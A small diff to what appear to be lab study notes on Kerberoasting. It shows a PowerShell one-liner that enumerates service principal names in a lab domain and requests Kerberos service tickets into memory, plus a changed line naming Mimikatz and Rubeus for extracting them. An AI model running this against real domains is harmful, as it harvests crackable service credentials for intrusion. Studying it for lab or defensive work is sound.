@@ -66,4 +66,4 @@ This is what even [[Rubeus]] does in default kerberoasting method:
 ```powershell
 PS > setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
-## Extract using [[Mimikatz#Kerberoasting|Mimikatz]]![[Mimikatz#Kerberoasting]]
+Once loaded in memory, it can be extracted using [[Mimikatz#Kerberoasting|Mimikatz]] or [[Rubeus#Kerberoasting|Rubeus]]
